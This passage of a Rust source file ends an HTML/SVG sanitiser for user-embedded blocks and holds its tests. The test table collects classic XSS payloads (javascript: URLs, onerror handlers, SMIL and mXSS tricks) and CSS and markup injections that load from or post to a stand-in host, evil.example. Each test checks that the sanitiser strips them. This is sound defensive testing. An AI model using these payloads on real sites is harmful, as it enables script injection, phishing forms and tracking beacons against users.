            !digits.is_empty() && digits.len() <= 7 && digits.chars().all(|c| c.is_ascii_digit())
        }
        None => {
            !name.is_empty() && name.len() <= 32 && name.chars().all(|c| c.is_ascii_alphanumeric())
        }
    };
    ok.then_some((name, rest))
}

/// A numeric reference's digits and radix (`#x26` → `26`, 16; `#38` →
/// `38`, 10); `None` for a named one.
fn numeric(name: &str) -> Option<(&str, u32)> {
    let digits = name.strip_prefix('#')?;
    Some(
        digits
            .strip_prefix(['x', 'X'])
            .map_or((digits, 10), |hex| (hex, 16)),
    )
}

/// `value` with its character references decoded, as a browser reads an
/// attribute: what is checked, and then written (escaped).
/// A named one it does not know becomes U+FFFD, which no scheme has.
fn decode(value: &str) -> String {
    let mut out = String::with_capacity(value.len());
    let mut rest = value;
    while let Some((before, after)) = rest.split_once('&') {
        out.push_str(before);
        let Some((name, past)) = entity(after) else {
            out.push('&');
            rest = after;
            continue;
        };
        let ch = match numeric(name) {
            Some((digits, radix)) => u32::from_str_radix(digits, radix)
                .ok()
                .and_then(char::from_u32),
            None => match name {
                "amp" => Some('&'),
                "lt" => Some('<'),
                "gt" => Some('>'),
                "quot" => Some('"'),
                "apos" => Some('\''),
                "colon" => Some(':'),
                "Tab" => Some('\t'),
                "NewLine" => Some('\n'),
                "nbsp" => Some('\u{a0}'),
                "copy" => Some('©'),
                "reg" => Some('®'),
                "trade" => Some('™'),
                "hellip" => Some('…'),
                "ndash" => Some('–'),
                "mdash" => Some('—'),
                "lsquo" => Some('‘'),
                "rsquo" => Some('’'),
                "ldquo" => Some('“'),
                "rdquo" => Some('”'),
                "times" => Some('×'),
                "middot" => Some('·'),
                "sharp" => Some('♯'),
                "flat" => Some('♭'),
                _ => None,
            },
        };
        out.push(ch.unwrap_or('\u{fffd}'));
        rest = past;
    }
    out.push_str(rest);
    out
}

/// `text` safe in HTML text and in a double-quoted attribute.
pub(crate) fn escape(text: &str, out: &mut String) {
    for ch in text.chars() {
        match ch {
            '&' => out.push_str("&amp;"),
            '<' => out.push_str("&lt;"),
            '>' => out.push_str("&gt;"),
            '"' => out.push_str("&quot;"),
            '\'' => out.push_str("&#39;"),
            other => out.push(other),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// The class the tests' blocks are boxed in.
    const SCOPE: &str = "site-block-t";

    /// Keyflow's engraving (keyflow#59), as its follow export writes it
    /// (`keyflow:features/engraver/src/engraver/export/follow.rs`), but
    /// with its sheet's attribute selector unquoted (`[aria-current=time]`,
    /// what keyflow has to write for the sheet to come through): an SVG
    /// whose root follows the playhead, a transparent rect per played bar,
    /// fonts named by presentation attributes. All of it comes through:
    /// geometry, classes, `data-*`, the sheet (under the block's scope),
    /// gradients referenced by `#id`, text.
    const CHART: &str = r##"<svg data-follow-playhead="" data-media="/s/abc/joy.mp3" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" viewBox="0 0 400 120" width="400" height="120" overflow="hidden" class="kf-chart">  <style>.kf-bar{fill:#f5a623;fill-opacity:0;pointer-events:all;cursor:pointer}.kf-bar[aria-current=time]{fill-opacity:0.18}</style>
<defs><linearGradient id="g"><stop offset="0" stop-color="#fff"/></linearGradient></defs><rect class="kf-bar" data-at="0.000" data-bar="1" data-pass="1" x="0" y="0" width="100" height="120" rx="2"/><rect class="kf-bar" data-at="2.500" x="100" y="0" width="100" height="120" fill="url(#g)"/><path d="M0 60 L400 60" stroke="currentColor" stroke-width="1.5" transform="translate(0,1)"/><use href="#g"/><text x="4" y="20" font-size="12" font-family="Bravura" fill="#000000">C &amp; G</text><text x="40" y="20" font-size="12" font-family="FreeSerif" font-weight="bold" text-anchor="middle">Am</text><a href="#bar-2"><circle cx="5" cy="5" r="2"/></a></svg>"##;

    #[test]
    fn an_svg_drawing_comes_through_whole() {
        let out = sanitize_block(CHART, SCOPE);
        for kept in [
            r#"viewBox="0 0 400 120""#,
            r#"class="kf-chart""#,
            r#"data-follow-playhead="""#,
            r#"data-media="/s/abc/joy.mp3""#,
            r#"<rect class="kf-bar" data-at="0.000" data-bar="1" data-pass="1" x="0" y="0" width="100" height="120" rx="2"></rect>"#,
            r#"data-at="2.500" x="100" y="0" width="100" height="120" fill="url(#g)""#,
            r#"<path d="M0 60 L400 60" stroke="currentColor" stroke-width="1.5" transform="translate(0,1)"></path>"#,
            r##"<linearGradient id="g"><stop offset="0" stop-color="#fff"></stop></linearGradient>"##,
            r##"<use href="#g"></use>"##,
            r##"<text x="4" y="20" font-size="12" font-family="Bravura" fill="#000000">C &amp; G</text>"##,
            r#"font-family="FreeSerif" font-weight="bold" text-anchor="middle">Am</text>"#,
            "<style>.site-block-t .kf-bar { fill:#f5a623; fill-opacity:0; pointer-events:all; cursor:pointer } .site-block-t .kf-bar[aria-current=time] { fill-opacity:0.18 }</style>",
            r##"<a href="#bar-2"><circle cx="5" cy="5" r="2"></circle></a>"##,
            r#"xmlns:xlink="http://www.w3.org/1999/xlink""#,
        ] {
            assert!(out.contains(kept), "lost {kept} in {out}");
        }
        assert!(out.ends_with("</svg>"), "{out}");
        // Written again, it is the same: nothing left to take out.
        assert_eq!(sanitize_block(&out, SCOPE), out);
        assert_safe(&out, CHART);
        // Outside a block's box, no sheet comes through.
        assert!(!sanitize(CHART).contains("<style"));
    }

    /// Keyflow's sheet as `keyflow:features/engraver/src/engraver/export/follow.rs`
    /// writes it today quotes its attribute selector (`[aria-current="time"]`),
    /// and the embedded-font export (`export/svg.rs`) writes `@font-face`
    /// with `url('data:…')`: both sheets are dropped whole, the drawing
    /// kept (the site's own CSS marks the bar at the playhead).
    #[test]
    fn keyflow_sheets_as_written_today_are_dropped_and_the_drawing_kept() {
        let follow = "<svg data-follow-playhead=\"\"><style>.kf-bar{fill:#f5a623;fill-opacity:0;pointer-events:all;cursor:pointer}.kf-bar[aria-current=\"time\"]{fill-opacity:0.18}</style><rect class=\"kf-bar\" data-at=\"0.000\"/></svg>";
        assert_eq!(
            sanitize_block(follow, SCOPE),
            "<svg data-follow-playhead=\"\"><rect class=\"kf-bar\" data-at=\"0.000\"></rect></svg>"
        );
        let fonts = "<svg><style type=\"text/css\">@font-face {\n  font-family: 'Bravura';\n  src: url('data:font/otf;base64,AA') format('opentype');\n}\n</style><text font-family=\"Bravura\">x</text></svg>";
        assert_eq!(
            sanitize_block(fonts, SCOPE),
            "<svg><text font-family=\"Bravura\">x</text></svg>"
        );
    }

    /// The sheet rewriter by itself: flat rules only, every selector put
    /// under the scope, nothing that names the page above it.
    #[test]
    fn a_sheet_is_put_under_its_block_or_dropped() {
        let scoped = |css: &str| scope_sheet(css, SCOPE);
        assert_eq!(
            scoped(".a{fill:red} g > .b, text:hover { opacity : 0.5 ; }").as_deref(),
            Some(".site-block-t .a { fill:red } .site-block-t g > .b, .site-block-t text:hover { opacity : 0.5 }")
        );
        // Already under the scope: kept as it is, so it is stable.
        assert_eq!(
            scoped(".site-block-t .a { fill:red }").as_deref(),
            Some(".site-block-t .a { fill:red }")
        );
        // The box itself is not the block's to style.
        assert_eq!(
            scoped(".site-block-t{margin-top:-500px}").as_deref(),
            Some(".site-block-t .site-block-t { margin-top:-500px }")
        );
        assert_eq!(scoped(".a{}"), None, "nothing to keep");
        for refused in [
            "body{display:none}",
            "html .a{fill:red}",
            ":root{color:red}",
            ":host .a{fill:red}",
            "> .a{fill:red}",
            "+ .a{fill:red}",
            "~ .a{fill:red}",
            ".a, body .b{fill:red}",
            ".a:is(.b, .c){fill:red}",
            ".a{fill:red}}body{display:none}",
            ".a{.b{fill:red}}",
            ".a{fill:red",
            ".a fill:red}",
            "@media screen{.a{fill:red}}",
            ".a{--x:fixed}",
            ".a{position:absolute}",
            ".a{color:red;position:fixed}",
            ".a{fill:var(--accent)}",
            ".a{fill:red} .b{background:url(x.png)}",
            ".a{content:\"x\"}",
            ".a{fill:red}/* */",
            ".a{fill:r\\65 d}",
            ".a;.b{fill:red}",
        ] {
            assert_eq!(scoped(refused), None, "{refused}");
        }
        // A scope that is not the site's box class keeps no sheet.
        assert_eq!(
            sanitize_block("<svg><style>.a{fill:red}</style></svg>", "x y"),
            "<svg></svg>"
        );
        assert!(scope_ok(SCOPE) && !scope_ok("site-block x") && !scope_ok("other"));
    }

    /// The first-party blocks: the lyrics block's list and an HTML block
    /// with media and a table.
    #[test]
    fn first_party_blocks_come_through_whole() {
        let lyrics = "<ol class=\"site-lyrics\" data-follow-playhead data-media=\"/s/x/a b.mp3\"><li data-at=\"1.500\"><button type=\"button\" class=\"site-lyric\">&lt;Me&gt; &amp; you</button></li></ol>";
        assert_eq!(
            sanitize(lyrics),
            "<ol class=\"site-lyrics\" data-follow-playhead=\"\" data-media=\"/s/x/a b.mp3\"><li data-at=\"1.500\"><button type=\"button\" class=\"site-lyric\">&lt;Me&gt; &amp; you</button></li></ol>"
        );
        let html = "<figure><audio controls preload=\"none\" src=\"/s/x/a.mp3\"></audio><figcaption><em>Take</em> 1</figcaption></figure><table><tr><td colspan=\"2\">C</td></tr></table><details open><summary>More</summary><img src=\"data:image/png;base64,AA\" alt=\"a\"></details>";
        assert_eq!(
            sanitize(html),
            "<figure><audio controls=\"\" preload=\"none\" src=\"/s/x/a.mp3\"></audio><figcaption><em>Take</em> 1</figcaption></figure><table><tr><td colspan=\"2\">C</td></tr></table><details open=\"\"><summary>More</summary><img src=\"data:image/png;base64,AA\" alt=\"a\"></details>"
        );
    }

    /// The review of #520: each reproduction, and the classic ways past a
    /// sanitiser. `Some(out)` is the exact output; every row's output is
    /// also checked by [`assert_safe`] and for `never`.
    #[test]
    #[allow(
        clippy::literal_string_with_formatting_args,
        reason = "CSS rules in the inputs, not format arguments"
    )]
    fn adversarial_inputs_table() {
        let table: &[(&str, Option<&str>)] = &[
            // Finding 2: an entity in SMIL's attributeName.
            (
                "<svg><a><animate attributeName=\"hre&#x66;\" values=\"javascript:alert(1)\"/><text>x</text></a></svg>",
                Some("<svg><a><text>x</text></a></svg>"),
            ),
            (
                "<svg><set attributeName=\"xlink:hre&#102;\" to=\"javascript:alert(1)\"/></svg>",
                Some("<svg></svg>"),
            ),
            (
                "<svg><animateTransform attributeName=\"transform\"/><animateMotion/><discard/><rect/></svg>",
                Some("<svg><rect></rect></svg>"),
            ),
            // Finding 3: outside CSS, a phishing form, pings, srcset, images.
            (
                "<style>@import url(https://evil.example/x.css); body{}</style><p>x</p>",
                Some("<p>x</p>"),
            ),
            (
                "<svg><style>@import url(https://evil.example/x.css); .a{fill:red}</style><rect class=\"a\"/></svg>",
                Some("<svg><rect class=\"a\"></rect></svg>"),
            ),
            (
                "<svg><style>.a{fill:red}</style><style>.b{background:u\\72l(https://evil.example/)}</style></svg>",
                Some("<svg><style>.site-block-t .a { fill:red }</style></svg>"),
            ),
            (
                "<div style=\"position:fixed;inset:0;background:url(https://evil.example/x.png)\">x</div>",
                Some("<div style=\"inset:0\">x</div>"),
            ),
            (
                "<div style=\"position : sticky; color: red; background: u\\72l(https://evil.example/)\">x</div>",
                Some("<div>x</div>"),
            ),
            (
                "<div style=\"position : sticky; color: red\">x</div>",
                Some("<div style=\"color: red\">x</div>"),
            ),
            (
                "<div style=\"position:/**/fixed\">x</div>",
                Some("<div>x</div>"),
            ),
            (
                "<form action=\"https://evil.example/\"><input type=password name=p><button type=submit formaction=\"https://evil.example/\">Go</button></form>",
                Some("<button>Go</button>"),
            ),
            (
                "<a href=\"https://ok.example/\" ping=\"https://evil.example/\">x</a>",
                Some("<a href=\"https://ok.example/\">x</a>"),
            ),
            (
                "<img src=\"/a.png\" srcset=\"https://evil.example/x.png 2x\">",
                Some("<img src=\"/a.png\">"),
            ),
            (
                "<svg><image href=\"http://evil.example/x.png\"/><image xlink:href=\"javascript:alert(1)\"/></svg>",
                Some("<svg><image></image><image></image></svg>"),
            ),
            (
                "<video src=\"https://ok.example/a.mp4\" poster=\"https://evil.example/p.png\" controls></video>",
                Some("<video src=\"https://ok.example/a.mp4\" controls=\"\"></video>"),
            ),
            // Finding 5: the page's own ids and data attributes.
            (
                "<div id=\"site-queue\">{\"tracks\":[]}</div><p id=\"Share-x\" data-site-media data-act=\"toggle\" data-x=\"1\">y</p><b id=\"comments\">z</b>",
                Some("<div>{&quot;tracks&quot;:[]}</div><p data-x=\"1\">y</p><b>z</b>"),
            ),
            // Quoting.
            ("<a href=javascript:alert(1)>x</a>", Some("<a>x</a>")),
            ("<a href='javascript:alert(1)'>x</a>", Some("<a>x</a>")),
            ("<a href=`javascript:alert(1)`>x</a>", Some("<a>x</a>")),
            (
                "<a title='a\"b' href=/x>x</a>",
                Some("<a title=\"a&quot;b\" href=\"/x\">x</a>"),
            ),
            // Duplicate attributes: the first is the browser's.
            (
                "<a href=\"https://ok.example/\" href=\"javascript:alert(1)\">x</a>",
                Some("<a href=\"https://ok.example/\">x</a>"),
            ),
            (
                "<a href=\"javascript:alert(1)\" HREF=\"https://ok.example/\">x</a>",
                Some("<a>x</a>"),
            ),
            // Null and control bytes in names and schemes.
            ("<a hr\0ef=\"javascript:alert(1)\">x</a>", Some("<a>x</a>")),
            ("<a href=\"java\0script:alert(1)\">x</a>", Some("<a>x</a>")),
            (
                "<a href=\"\u{1}javascript:alert(1)\">x</a>",
                Some("<a>x</a>"),
            ),
            (
                "<a href=\"java&#0;script:alert(1)\">x</a>",
                Some("<a>x</a>"),
            ),
            (
                "<a href=\"javascript&colon;alert(1)\">x</a>",
                Some("<a>x</a>"),
            ),
            ("<svg on\u{b}load=alert(1)></svg>", Some("<svg></svg>")),
            ("<scr\0ipt>alert(1)</scr\0ipt>", Some("alert(1)")),
            (
                "<img src=\"data\t:image/svg+xml,&lt;svg onload=alert(1)&gt;\">",
                Some("<img>"),
            ),
            (
                "<a href=\"//evil.example/\">x</a><a href=\"/\\evil.example/\">y</a>",
                Some("<a>x</a><a>y</a>"),
            ),
            ("<a href=\"http://evil.example/\">x</a>", Some("<a>x</a>")),
            (
                "<a href=\"mailto:a@b.example\">m</a><a href=\"x/y?z#w\">r</a>",
                Some("<a href=\"mailto:a@b.example\">m</a><a href=\"x/y?z#w\">r</a>"),
            ),
            // Elements whose content a browser reads differently.
            (
                "<svg><title><script>alert(1)</script><div>t</div></title></svg>",
                Some("<svg><title>t</title></svg>"),
            ),
            (
                "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\"></p></noscript>",
                None,
            ),
            (
                "<template><script>alert(1)</script></template>ok",
                Some("ok"),
            ),
            (
                "<textarea><script>alert(1)</script></textarea>ok",
                Some("ok"),
            ),
            ("<xmp><script>alert(1)</script></xmp>ok", Some("ok")),
            ("<plaintext><script>alert(1)</script>", Some("")),
            (
                "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
                Some(""),
            ),
            (
                "<svg><p><style><img src=x onerror=alert(1)></style></p></svg>",
                Some("<svg></svg>"),
            ),
            // Comments, CDATA, processing instructions, a doctype.
            ("<!--<img src=x onerror=alert(1)>-->ok", Some("ok")),
            ("<!--><img src=x onerror=alert(1)>-->ok", Some("ok")),
            (
                "<svg><![CDATA[<script>alert(1)</script>]]></svg>",
                Some("<svg>&lt;script&gt;alert(1)&lt;/script&gt;</svg>"),
            ),
            (
                "<?xml-stylesheet href=\"https://evil.example/x.css\"?><p>x</p>",
                Some("<p>x</p>"),
            ),
            ("<!DOCTYPE html><p>x</p>", Some("<p>x</p>")),
            // Links inside the drawing only.
            (
                "<svg><use href=\"https://evil.example/x.svg#a\"/><use xlink:href=\"data:image/svg+xml;base64,PHN2Zz4=#x\"/><use href=\"#a\"/></svg>",
                Some("<svg><use></use><use></use><use href=\"#a\"></use></svg>"),
            ),
            (
                "<svg><rect fill=\"url(https://evil.example/x.svg#p)\"/><rect fill=\"url( '#p')\" mask=\"u\\72l(x)\"/><rect fill=\"url(#p)\" clip-path=\"url(#c) \"/><rect fill=\"url(#p)url(x)\"/></svg>",
                Some("<svg><rect></rect><rect></rect><rect fill=\"url(#p)\" clip-path=\"url(#c) \"></rect><rect></rect></svg>"),
            ),
            // Handlers, frames, the rest.
            (
                "<div is=\"x-y\" srcdoc=\"<script>alert(1)</script>\" onclick=\"x()\" tabindex=\"1\">d</div><details open ontoggle=alert(1)></details>",
                Some("<div>d</div><details open=\"\"></details>"),
            ),
            (
                "<svg><foreignObject><div onclick=\"x()\"><script>alert(1)</script></div></foreignObject><rect/></svg>",
                Some("<svg><rect></rect></svg>"),
            ),
            (
                "<iframe srcdoc=\"<script>alert(1)</script>\"></iframe><object data=\"x\"></object><embed src=\"x\"><base href=\"/\"><meta http-equiv=refresh content=\"0;url=javascript:alert(1)\"><link rel=stylesheet href=\"https://evil.example/x.css\">ok",
                Some("ok"),
            ),
            ("<image src=\"https://ok.example/a.png\">", Some("")),
            // The second review of #520 (of 2a46d49e). Finding 1: CSS
            // strings and comments desynced the comment stripper.
            (
                "<svg><style>a{content:\"/*\"} *{background:url(https://evil.example/)} b{content:\"*/\"}</style></svg>",
                Some("<svg></svg>"),
            ),
            (
                "<li style='list-style:\"/*\" url(https://evil.example/li) inside'>x</li>",
                Some("<li>x</li>"),
            ),
            (
                "<li style=\"color:red; list-style:url(https://evil.example/li) inside\">x</li>",
                Some("<li style=\"color:red\">x</li>"),
            ),
            (
                "<p style=\"background:image-set(https://evil.example/a 1x); border-image:paint(x); color:red\">x</p>",
                Some("<p style=\"color:red\">x</p>"),
            ),
            // Finding 2: covering or restyling the page.
            (
                "<div style=\"--p:fixed; position:var(--p); inset:0; z-index:99999; background:white\">x</div>",
                Some("<div style=\"inset:0; z-index:99999; background:white\">x</div>"),
            ),
            (
                "<div style=\"position:absolute;top:0;left:0;width:100vw;height:100vh;z-index:99999\">x</div>",
                Some("<div style=\"top:0; left:0; width:100vw; height:100vh; z-index:99999\">x</div>"),
            ),
            (
                "<div style=\"position:relative; background-position:0 0\">x</div>",
                Some("<div style=\"position:relative; background-position:0 0\">x</div>"),
            ),
            (
                "<svg><style>body{display:none} .site-player{display:none}</style></svg>",
                Some("<svg></svg>"),
            ),
            (
                "<svg><style>.site-player{display:none}</style></svg>",
                Some("<svg><style>.site-block-t .site-player { display:none }</style></svg>"),
            ),
            (
                "<svg><style>:root{--accent:red} .a{fill:red}</style><style>.a{position:absolute}</style></svg>",
                Some("<svg></svg>"),
            ),
            // Finding 3: presentation attributes are CSS, all of it.
            (
                "<svg><rect mask=\"image-set('https://evil.example/m' 1x)\"/><rect mask=\"image-set(https://evil.example/m 1x)\" fill=\"var(--x)\"/></svg>",
                Some("<svg><rect></rect><rect></rect></svg>"),
            ),
            // Finding 4: a block's image comes from the share, not elsewhere.
            (
                "<img src=\"https://evil.example/b.png\" alt=\"b\"><svg><image href=\"https://evil.example/i.png\"/><image xlink:href=\"/s/x/i.png\"/></svg>",
                Some("<img alt=\"b\"><svg><image></image><image xlink:href=\"/s/x/i.png\"></image></svg>"),
            ),
            // Finding 6: an id shadowing a global the page's scripts read.
            (
                "<div id=\"architect\">x</div><p id=\"addEventListener\">y</p><b id=\"EventSource\">z</b><i id=\"chart-1\">w</i>",
                Some("<div>x</div><p>y</p><b>z</b><i id=\"chart-1\">w</i>"),
            ),
            (
                "<rect/><div><svg><div>x</div></svg></div>",
                Some("<div><svg>x</svg></div>"),
            ),
        ];
        let never = [
            "<script",
            "<style>@",
            "<form",
            "<input",
            "<animate",
            "<set",
            "<foreignobject",
            "<iframe",
            "<img src=\"x\" on",
            " on",
            "javascript",
            "evil.example",
            "srcdoc",
            "srcset",
            "ping=",
            "action=",
            "site-queue",
            "data-site",
            "position:fixed",
            "position:absolute",
            "var(",
            "image-set",
            "id=\"architect\"",
        ];
        for (markup, expected) in table {
            let out = bounded(markup);
            if let Some(expected) = expected {
                assert_eq!(&out, expected, "from {markup}");
            }
            let lower = out.to_ascii_lowercase();
            for bad in never {
                assert!(!lower.contains(bad), "{bad} in {out}\n  from {markup}");
            }
            assert_safe(&out, markup);
            assert_eq!(sanitize_block(&out, SCOPE), out, "not stable: {markup}");
        }
    }

    /// The property the table is held to, checked by a reader of its own
    /// (not the sanitiser's rules): every `<` in `out` opens or closes an
    /// allowed element, every attribute is allowed and double-quoted, and
    /// every URL has an allowed scheme.
    fn assert_safe(out: &str, from: &str) {
        let allowed_tag = |t: &str| SVG_ELEMENTS.contains(&t) || HTML_ELEMENTS.contains(&t);
        let mut rest = out;
        while let Some((_, after)) = rest.split_once('<') {
            if let Some(end) = after.strip_prefix('/') {
                let (name, tail) = end.split_once('>').expect("an end tag ends");
                assert!(allowed_tag(name), "</{name}> in {out}\n  from {from}");
                rest = tail;
                continue;
            }
            let end = after
                .find([' ', '>'])
                .unwrap_or_else(|| panic!("a tag ends in {out}"));
            let (name, mut tail) = after.split_at(end);
            assert!(allowed_tag(name), "<{name}> in {out}\n  from {from}");
            while let Some(attr) = tail.strip_prefix(' ') {
                let (attr_name, value_at) = attr.split_once("=\"").expect("attr=\"value\"");
                let (value, past) = value_at.split_once('"').expect("a closing quote");
                assert!(!value.contains('<'), "< in a value: {out}");
                check_attr(name, attr_name, &decode(value), out, from);
                tail = past;
            }
            let after_tag = tail.strip_prefix('>').expect("a tag ends with >");
            if name == "style" {
                let (css, past) = after_tag.split_once("</style>").expect("a closed sheet");
                assert!(!css.contains('<') && !css.contains('&'), "{out}");
                assert!(
                    inert_by_own_reading(css, false),
                    "a sheet that loads or moves: {out}\n  from {from}"
                );
                // Every rule is under the block's scope, and flat.
                for rule in css.split('}').map(str::trim).filter(|r| !r.is_empty()) {
                    let (selectors, body) = rule.split_once('{').expect("a rule");
                    assert!(!body.contains('{'), "a nested rule: {out}");
                    for sel in selectors.split(',') {
                        let sel = sel.trim();
                        let under = sel
                            .strip_prefix(".site-block-t ")
                            .is_some_and(|r| !r.trim().is_empty());
                        assert!(under, "{sel} not under the scope: {out}\n  from {from}");
                        let lower = sel.to_ascii_lowercase();
                        assert!(
                            !["body", "html", ":root", ":host"].iter().any(|b| lower.contains(b)),
                            "{sel}: {out}"
                        );
                    }
                }
                rest = past;
                continue;
            }
            rest = after_tag;
        }
    }

    fn check_attr(tag: &str, name: &str, value: &str, out: &str, from: &str) {
        let lower = name.to_ascii_lowercase();
        let known = [
            "class",
            "id",
            "title",
            "lang",
            "dir",
            "role",
            "style",
            "href",
            "xlink:href",
            "src",
            "alt",
            "width",
            "height",
            "controls",
            "preload",
            "type",
            "datetime",
            "colspan",
            "rowspan",
            "span",
            "open",
            "xmlns",
            "xmlns:xlink",
        ];
        assert!(
            known.contains(&lower.as_str())
                || lower.starts_with("aria-")
                || (lower.starts_with("data-") && !lower.starts_with("data-site-"))
                || SVG_ATTRS.contains(&lower.as_str()),
            "{name} on <{tag}> in {out}\n  from {from}"
        );
        assert!(!lower.starts_with("on"), "{name} in {out}");
        if lower == "id" {
            let id = value.to_ascii_lowercase();
            assert!(!id.starts_with("site-"), "{out}");
            assert!(
                !["architect", "addeventlistener", "eventsource", "matchmedia"].contains(&id.as_str()),
                "id={value} shadows a global: {out}\n  from {from}"
            );
        }
        if matches!(lower.as_str(), "href" | "xlink:href" | "src") {
            let url: String = value
                .chars()
                .filter(|c| !c.is_ascii_whitespace() && !c.is_control())
                .collect::<String>()
                .to_ascii_lowercase();
            let scheme = url
                .split_once(':')
                .filter(|(s, _)| !s.contains(['/', '?', '#']))
                .map(|(s, _)| s);
            let image = matches!((tag, lower.as_str()), ("img", "src") | ("image", _));
            let ok = match scheme {
                None => !url.starts_with("//") && !url.starts_with("/\\"),
                // A block's image is never from another site (a beacon).
                Some("https") => !image,
                Some("mailto") => true,
                Some("data") => ["png", "jpeg", "gif", "webp"]
                    .iter()
                    .any(|k| url.starts_with(&format!("data:image/{k}"))),
                Some(_) => false,
            };
            assert!(ok, "{name}={value} in {out}\n  from {from}");
        }
        if lower == "style" || SVG_ATTRS.contains(&lower.as_str()) {
            assert!(
                inert_by_own_reading(value, lower != "style"),
                "{name}={value} in {out}\n  from {from}"
            );
        }
    }

    /// Whether `css` is inert, read here without the sanitiser's code: no
    /// string, comment, escape, `var()`, custom property or at-rule;
    /// nothing that loads; no `position` but `static` or `relative`. With
    /// `local_urls`, `url(#id)` (and only that) is allowed.
    fn inert_by_own_reading(css: &str, local_urls: bool) -> bool {
        let lower = css.to_ascii_lowercase();
        if ["\"", "'", "/*", "\\", "var(", "--", "@"]
            .iter()
            .any(|b| lower.contains(b))
        {
            return false;
        }
        let squeezed: String = lower.chars().filter(|c| !c.is_whitespace()).collect();
        let urls_ok = squeezed.match_indices("url(").all(|(at, _)| {
            let rest = &squeezed[at + 4..];
            local_urls
                && rest.strip_prefix('#').is_some_and(|r| {
                    let id_end = r.find(')').unwrap_or(0);
                    id_end > 0
                        && r[..id_end]
                            .chars()
                            .all(|c| c.is_ascii_alphanumeric() || "-_.".contains(c))
                })
        });
        let loads = [
            "image-set(",
            "image(",
            "src(",
            "cross-fade(",
            "element(",
            "paint(",
            "expression(",
            "-moz-binding",
            "behavior",
            "javascript:",
        ]
        .iter()
        .any(|b| squeezed.contains(b));
        let positions_ok = squeezed.match_indices("position:").all(|(at, f)| {
            let declaration_starts = at == 0 || squeezed[..at].ends_with([';', '{']);
            let value = squeezed[at + f.len()..]
                .split([';', '}', '!'])
                .next()
                .unwrap_or_default();
            !declaration_starts || value == "static" || value == "relative"
        });
        urls_ok && !loads && positions_ok
    }

    #[test]
    fn the_rules_by_themselves() {
        assert_eq!(element_rule("foreignObject", true), Rule::Drop);
        assert_eq!(element_rule("SCRIPT", false), Rule::Drop);
        assert_eq!(element_rule("set", true), Rule::Drop);
        assert_eq!(element_rule("animate", true), Rule::Drop);
        assert_eq!(
            element_rule("lineargradient", true),
            Rule::Keep("linearGradient")
        );
        assert_eq!(element_rule("rect", false), Rule::Unwrap);
        assert_eq!(element_rule("div", true), Rule::Unwrap);
        assert_eq!(element_rule("style", false), Rule::Drop);
        assert_eq!(element_rule("style", true), Rule::Keep("style"));
        assert_eq!(element_rule("form", false), Rule::Unwrap);
        assert_eq!(
            attr_rule("rect", "data-at", "1.5", true).as_deref(),
            Some("1.5")
        );
        assert_eq!(
            attr_rule("svg", "viewBox", "0 0 1 1", true).as_deref(),
            Some("0 0 1 1")
        );
        assert_eq!(attr_rule("div", "viewBox", "0 0 1 1", false), None);
        assert_eq!(attr_rule("rect", "onclick", "x()", true), None);
        assert_eq!(attr_rule("a", "href", "\tjavascript:x", false), None);
        assert_eq!(
            attr_rule("a", "href", "https://ok.example/", false).as_deref(),
            Some("https://ok.example/")
        );
        assert!(attr_rule("img", "src", "data:image/png;base64,AA", false).is_some());
        assert_eq!(
            attr_rule("img", "src", "data:image/svg+xml;base64,AA", false),
            None
        );
        assert_eq!(
            attr_rule("audio", "src", "data:audio/mp3;base64,AA", false),
            None
        );
        assert_eq!(attr_rule("use", "href", "other.svg#x", true), None);
        assert_eq!(attr_rule("button", "type", "submit", false), None);
    }

    /// `markup` sanitised, checked for the linear bound: at most one loop
    /// pass per input byte and six output bytes per input byte (plus the
    /// end tags of what was left open).
    fn bounded(markup: &str) -> String {
        let (out, passes) = sanitize_counting(markup, Some(SCOPE));
        assert!(
            passes <= markup.len(),
            "{passes} passes over {} bytes",
            markup.len()
        );
        assert!(
            out.len()
                <= markup
                    .len()
                    .saturating_mul(6)
                    .saturating_add(MAX_OPEN.saturating_mul(3)),
            "{} bytes out of {}",
            out.len(),
            markup.len()
        );
        out
    }

    /// The input that took a node's test run to 89 GB: a closed
    /// `<style>`. The style branch handed `Writer::markup` the end tag's
    /// own `<`, which it wrote as `&lt;` and returned unread, forever.
    #[test]
    fn a_closed_style_sheet_ends() {
        assert_eq!(bounded("<style>a{}</style>b"), "b");
        assert_eq!(
            bounded("<svg><style>.x{fill:red}</style><rect/></svg>"),
            "<svg><style>.site-block-t .x { fill:red }</style><rect></rect></svg>"
        );
        // An end tag that only starts like one, and one never ended.
        assert_eq!(bounded("<svg><style>a</styles>b</style"), "<svg></svg>");
        assert_eq!(bounded("<style>a</styles>b</style"), "");
        bounded(&"<style></style>".repeat(10_000));
        bounded(&"<svg><style></style>".repeat(10_000));
    }

    /// A sheet that holds markup is dropped whole: in an SVG a `<style>`
    /// is not raw text, so its `<` would open a tag.
    #[test]
    fn a_style_sheet_holds_no_markup() {
        assert_eq!(
            sanitize("<svg><style><img src=x onerror=alert(1)></style><rect/></svg>"),
            "<svg><rect></rect></svg>"
        );
        assert_eq!(sanitize("<style>a{}</STYLE ><script>x()</script>"), "");
    }

    #[test]
    fn it_is_always_well_formed() {
        assert_eq!(
            sanitize("<div><svg><g><rect></div>tail</span>"),
            "<div><svg><g><rect></rect></g></svg></div>tail"
        );
        assert_eq!(sanitize("a < b && c > d"), "a &lt; b &amp;&amp; c &gt; d");
        assert_eq!(sanitize("<p title=a\"b>x"), "<p title=\"a&quot;b\">x</p>");
        assert_eq!(sanitize("<br><hr/><p/>"), "<br><hr><p></p>");
        assert_eq!(sanitize("<\"x\">"), "&lt;&quot;x&quot;&gt;");
    }

    #[test]
    fn adversarial_markup_ends_and_stays_linear() {
        for markup in [
            "<",
            "a<",
            "<<<<",
            "<a",
            "<a b",
            "<a b=",
            "<a b=\"",
            "<a b='x",
            "<a b=\"x\" c",
            "</",
            "</a",
            "<!--",
            "<![CDATA[",
            "<!",
            "<?",
            "&",
            "&amp",
            "&#",
            "&#x",
            "a&b&c&",
            "<svg><g><rect>",
            "<svg><svg><svg>",
            "<script>",
            "<script><script",
            "<script></script",
            "<style>",
            "<style></",
            "<svg><style>",
            "<svg><style></",
            "<p title=\"&amp\">&lt",
        ] {
            let out = bounded(markup);
            assert!(!out.to_ascii_lowercase().contains("<script"), "{out}");
            assert_safe(&out, markup);
        }
        assert_eq!(bounded("&amp"), "&amp;amp");
